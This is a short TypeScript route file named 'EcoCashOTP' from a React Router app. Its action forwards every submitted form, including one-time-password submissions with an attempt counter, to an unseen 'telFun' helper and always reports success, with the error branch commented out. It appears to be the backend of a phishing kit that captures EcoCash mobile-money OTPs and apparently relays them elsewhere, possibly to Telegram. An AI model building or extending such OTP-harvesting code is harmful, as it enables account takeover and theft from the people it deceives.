import { telFun } from "../../lib/telFun";
import type { Route } from "./+types/api";




export async function action({request}: Route.ActionArgs) {
    const formData = await request.formData();
    const action = formData.get("action");
    
    const res= await telFun(formData);
     if (action === "submit-otp") {
    const attempt = Number(formData.get("attempt")||"0");

        
        
            return {
                success: true,
            }
        
        // return {
        //     error: true,
        // }
    }
    return {
            success: true,
            act: "sending",
        }

}

export default function EcoCashOTP() {
    return (
        <div>
            
        </div>
    )
}